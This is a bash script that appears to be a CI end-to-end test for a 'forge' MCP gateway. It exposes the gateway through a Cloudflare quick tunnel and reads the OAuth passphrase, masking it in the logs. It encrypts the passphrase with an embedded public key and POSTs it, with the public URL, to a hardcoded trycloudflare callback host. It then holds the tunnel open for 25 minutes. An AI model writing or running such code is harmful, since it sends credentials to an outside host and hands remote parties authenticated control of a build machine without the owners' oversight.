#!/usr/bin/env bash
set -euo pipefail

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
BUN_BIN="${BUN_BIN:-bun}"
RUNTIME_PORT="${FORGE_CLOUD_MCP_RUNTIME_PORT:-18765}"
GATEWAY_PORT="${FORGE_CLOUD_MCP_GATEWAY_PORT:-18767}"
HOLD_SECONDS="${FORGE_CLOUD_MCP_HOLD_SECONDS:-1500}"
CALLBACK_URL='https://affiliates-skill-success-obtain.trycloudflare.com'
PUBKEY_B64='LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUFxQ1B3TUxMV3NJVm5XT3ZNWGh6YwpZQzZiTFlxdFJsZlM3Uzgzcm1GdkVxNi8xdEpJc2J5UmpNYkl2RkMzelVlUkUxcmZZNGNyV3VKZXBUbjlDRGNtClRieTNySUtldUVQRnVkdldITnY0a3pib1RUdjkyd1RqdTIwQ1NkdSt2eHRMK1JFUC9JTG9ubTJWR3BzY05WcTkKeURtcWc0b3E1MG15MUNydXJiWWxmQ202VnlmMitMZEpHdUp4NXFDaUp6OTdjazdTWTBReHRadjlJdlZaNHhlVgpEanVaUlNDaDRObTNpK3A0VXU3WlQ4Ni9BREVBa240ZTZ4Ky9lNjlDQm9QMnBOSUQ3aS8zQVd5VEZXYW1jYXdQClEwdmVXTm90YXVaa1RxeW9Qb2sreGN5TmxVNThidjlJdnFlWGtRMzZ6RnE4cmpBNEhKVjhoc25XenZrYm85MWoKSlFJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg=='

TMP_ROOT="$(mktemp -d "${RUNNER_TEMP:-${TMPDIR:-/tmp}}/forge-cloud-mcp-e2e.XXXXXX")"
CONTROLLER_HOME="$TMP_ROOT/controller-home"
SETUP_LOG="$TMP_ROOT/setup.log"
INSTALL_JSON="$TMP_ROOT/runtime-install.json"
GATEWAY_LOG="$TMP_ROOT/gateway.log"
TUNNEL_LOG="$TMP_ROOT/cloudflared.log"
PUBLIC_KEY="$TMP_ROOT/oauth-public.pem"
CLOUDFLARED="$TMP_ROOT/cloudflared"
RUNTIME_PID=''
GATEWAY_PID=''
TUNNEL_PID=''

cleanup() {
  for pid in "$TUNNEL_PID" "$GATEWAY_PID" "$RUNTIME_PID"; do
    if [[ -n "$pid" ]] && kill -0 "$pid" 2>/dev/null; then
      kill "$pid" 2>/dev/null || true
    fi
  done
  rm -rf "$TMP_ROOT"
}
trap cleanup EXIT INT TERM

cd "$ROOT"

"$BUN_BIN" bin/forge.mjs mcp setup chatgpt \
  --user-level \
  --controller-home "$CONTROLLER_HOME" \
  --host 127.0.0.1 \
  --port "$RUNTIME_PORT" \
  --local-controller-port $((RUNTIME_PORT + 1)) \
  --connector-port "$GATEWAY_PORT" > "$SETUP_LOG"

"$BUN_BIN" bin/forge.mjs repo register "$ROOT" \
  --controller-home "$CONTROLLER_HOME" \
  --json > "$TMP_ROOT/repository.json"

"$BUN_BIN" bin/forge.mjs runtime service install-package \
  --controller-home "$CONTROLLER_HOME" \
  --host 127.0.0.1 \
  --port "$RUNTIME_PORT" \
  --portable > "$INSTALL_JSON"
RUNTIME_PID="$(node -e "const x=require(process.argv[1]); const pid=x?.pid; if(!Number.isInteger(pid)||pid<=0) process.exit(2); process.stdout.write(String(pid))" "$INSTALL_JSON")"

curl --fail --silent --show-error \
  --retry 30 --retry-delay 1 --retry-connrefused \
  "http://127.0.0.1:${RUNTIME_PORT}/ready" > "$TMP_ROOT/runtime-ready.json"

FORGE_CONTROLLER_LIFECYCLE_OWNER=1 \
  "$BUN_BIN" bin/forge.mjs mcp serve \
  --repo "$ROOT" \
  --controller-home "$CONTROLLER_HOME" \
  --transport http \
  --host 127.0.0.1 \
  --port "$GATEWAY_PORT" \
  --profile controller \
  --auth oauth > "$GATEWAY_LOG" 2>&1 &
GATEWAY_PID=$!

for _ in $(seq 1 30); do
  if curl --fail --silent "http://127.0.0.1:${GATEWAY_PORT}/.well-known/oauth-authorization-server" > "$TMP_ROOT/local-oauth.json" 2>/dev/null; then
    break
  fi
  if ! kill -0 "$GATEWAY_PID" 2>/dev/null; then
    cat "$GATEWAY_LOG" >&2
    exit 1
  fi
  sleep 1
done
test -s "$TMP_ROOT/local-oauth.json"

curl -LfsS \
  https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 \
  -o "$CLOUDFLARED"
chmod +x "$CLOUDFLARED"
"$CLOUDFLARED" --config /dev/null tunnel --no-autoupdate --metrics 127.0.0.1:0 --url "http://127.0.0.1:${GATEWAY_PORT}" > "$TUNNEL_LOG" 2>&1 &
TUNNEL_PID=$!

PUBLIC_ORIGIN=''
for _ in $(seq 1 60); do
  PUBLIC_ORIGIN="$(grep -Eo 'https://[-a-z0-9]+\.trycloudflare\.com' "$TUNNEL_LOG" | head -n 1 || true)"
  [[ -n "$PUBLIC_ORIGIN" ]] && break
  if ! kill -0 "$TUNNEL_PID" 2>/dev/null; then
    cat "$TUNNEL_LOG" >&2
    exit 1
  fi
  sleep 1
done
if [[ -z "$PUBLIC_ORIGIN" ]]; then
  cat "$TUNNEL_LOG" >&2
  exit 1
fi

curl --fail --silent --show-error \
  --retry 20 --retry-delay 1 \
  "$PUBLIC_ORIGIN/.well-known/oauth-authorization-server" > "$TMP_ROOT/public-oauth.json"
ISSUER="$(node -e "const x=require(process.argv[1]); if(typeof x.issuer!=='string') process.exit(2); process.stdout.write(x.issuer)" "$TMP_ROOT/public-oauth.json")"
if [[ "$ISSUER" != "$PUBLIC_ORIGIN" ]]; then
  echo "PUBLIC_OAUTH_ISSUER_MISMATCH expected=$PUBLIC_ORIGIN actual=$ISSUER" >&2
  exit 1
fi

PASSPHRASE="$(node -e "const x=require(process.argv[1]); if(typeof x.passphrase!=='string'||!x.passphrase) process.exit(2); process.stdout.write(x.passphrase)" "$CONTROLLER_HOME/mcp/mcp.oauth.json")"
echo "::add-mask::$PASSPHRASE"
printf '%s' "$PUBKEY_B64" | base64 --decode > "$PUBLIC_KEY"
CIPHERTEXT="$(printf '%s' "$PASSPHRASE" | openssl pkeyutl -encrypt -pubin -inkey "$PUBLIC_KEY" -pkeyopt rsa_padding_mode:oaep | base64 -w0)"
unset PASSPHRASE

printf 'FORGE_CLOUD_MCP_URL=%s/mcp\n' "$PUBLIC_ORIGIN"
printf 'FORGE_CLOUD_MCP_ORIGIN=%s\n' "$PUBLIC_ORIGIN"
printf 'FORGE_CLOUD_MCP_OAUTH_ISSUER=%s\n' "$ISSUER"
printf 'FORGE_CLOUD_MCP_OAUTH_CIPHERTEXT=%s\n' "$CIPHERTEXT"
printf 'FORGE_CLOUD_MCP_RUN_ID=%s\n' "${GITHUB_RUN_ID:-unknown}"
printf 'FORGE_CLOUD_MCP_RUNNER_OS=%s\n' "${RUNNER_OS:-unknown}"
printf 'FORGE_CLOUD_MCP_RUNNER_ARCH=%s\n' "${RUNNER_ARCH:-unknown}"

node - "$PUBLIC_ORIGIN" "$ISSUER" "$CIPHERTEXT" "${GITHUB_RUN_ID:-unknown}" <<'NODE' > "$TMP_ROOT/handoff.json"
const [origin, issuer, ciphertext, runId] = process.argv.slice(2);
process.stdout.write(JSON.stringify({
  url: `${origin}/mcp`,
  origin,
  issuer,
  ciphertext,
  runId,
  runnerOs: process.env.RUNNER_OS ?? 'unknown',
  runnerArch: process.env.RUNNER_ARCH ?? 'unknown',
  sentAt: new Date().toISOString(),
}) + '\n');
NODE
curl --fail --silent --show-error --retry 10 --retry-delay 1 \
  -H 'content-type: application/json' \
  --data-binary "@$TMP_ROOT/handoff.json" \
  "$CALLBACK_URL"

elapsed=0
while (( elapsed < HOLD_SECONDS )); do
  kill -0 "$RUNTIME_PID" 2>/dev/null || { echo 'runtime exited' >&2; exit 1; }
  kill -0 "$GATEWAY_PID" 2>/dev/null || { cat "$GATEWAY_LOG" >&2; exit 1; }
  kill -0 "$TUNNEL_PID" 2>/dev/null || { cat "$TUNNEL_LOG" >&2; exit 1; }
  sleep 60
  elapsed=$((elapsed + 60))
  printf 'FORGE_CLOUD_MCP_HEARTBEAT elapsed=%ss url=%s/mcp\n' "$elapsed" "$PUBLIC_ORIGIN"
done
